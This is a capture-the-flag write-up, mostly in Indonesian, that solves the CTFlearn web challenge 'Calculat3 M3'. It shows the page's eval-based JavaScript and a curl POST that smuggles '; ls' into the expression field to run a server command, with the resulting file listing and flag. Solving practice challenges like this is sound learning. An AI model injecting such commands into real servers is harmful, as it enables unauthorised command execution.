# Calculat3 M3 (80 Points)
Here! http://web.ctflearn.com/web7/ I forget how we were doing those calculations, but something tells me it was pretty insecure.
# Solved
Disini ada source yang mengijinkan kita untuk melakukan eksekusi shell https://web.ctflearn.com/web7/calc.js
```js
function c(val)
{
document.getElementById("d").value=val;
}
function v(val)
{
document.getElementById("d").value+=val;
}
function e() 
{ 
try 
{ 
  c(eval(document.getElementById("d").value)) 
} 
catch(e) 
{
  c('Error') 
} 
}  
```
Sedangkan source dari web tersebut
```html
<input type="text" name="expression" readonly size="18" id="d"></div>
```
<b>READONLY</b>, saya menggunakan cURL untuk menyelesaikannya. <b>Exploit: </b><i>expression=; ls</i>
```
curl 'https://web.ctflearn.com/web7/' \
  -H 'authority: web.ctflearn.com' \
  -H 'cache-control: max-age=0' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'origin: https://web.ctflearn.com' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-user: ?1' \
  -H 'sec-fetch-dest: document' \
  -H 'referer: https://web.ctflearn.com/web7/' \
  -H 'accept-language: en-US,en;q=0.9,id;q=0.8' \
  -H 'cookie: _ga=GA1.2.223386054.1598082072; __cfduid=deb41ee7e65a1706b83c543e5e734c7f41600775588; _gid=GA1.2.339889724.1601173366' \
  --data-raw 'expression=; ls' \
  --compressed
```
```html
calc.js
ctf{watch_0ut_f0r_th3_m0ng00s3}
index.php
main.css
main.css
<html>
<head>
  <link rel="stylesheet" href="main.css">
    <script type="text/javascript" src="calc.js"></script>

    </head>
    </body>
<div class="box">
```
Flag : <b>ctf{watch_0ut_f0r_th3_m0ng00s3}</b>